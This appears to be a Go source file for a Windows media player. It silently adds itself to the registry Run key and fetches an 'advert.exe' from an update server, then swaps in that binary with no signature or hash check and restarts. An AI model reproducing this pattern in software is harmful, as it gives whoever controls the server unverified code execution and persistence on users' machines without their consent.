//go:build windows

package main

import (
    "encoding/json"
    "net/http"
    "os"
    "os/exec"
    "strings"
    "time"

    "github.com/minio/selfupdate"
    "golang.org/x/sys/windows/registry"
)

type APIResponse struct {
    Success bool    `json:"success"`
    Status  int     `json:"status"`
    Data    AppData `json:"data"`
}

type AppData struct {
    Version int    `json:"version"`
    URL     string `json:"url"`
}

func (a *App) enableAutoStart() {
    exe, err := os.Executable()
    if err != nil {
        return
    }
    key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
    if err != nil {
        return
    }
    defer key.Close()
    _ = key.SetStringValue("ForlifeMediaPlayer", exe)
}

func (a *App) silentUpdate() {
    client := http.Client{Timeout: 15 * time.Second}
    resp, err := client.Get(WINDOW_CHECK_UPDATE_URL)
    if err != nil {
        return
    }
    defer resp.Body.Close()

    var apiRes APIResponse
    if err := json.NewDecoder(resp.Body).Decode(&apiRes); err != nil {
        return
    }

    if !apiRes.Success ||
        apiRes.Data.Version <= AppVersionInt ||
        apiRes.Data.URL == "" ||
        (!strings.Contains(apiRes.Data.URL, "advert.exe") && !strings.Contains(apiRes.Data.URL, "advert.exe")) {
        return
    }

    exeResp, err := http.Get(apiRes.Data.URL)
    if err != nil {
        return
    }
    defer exeResp.Body.Close()

    err = selfupdate.Apply(exeResp.Body, selfupdate.Options{})
    if err == nil {
        a.restartApp()
    }
}

func (a *App) restartApp() {
    self, _ := os.Executable()
    cmd := exec.Command(self)
    cmd.Start()
    os.Exit(0)
}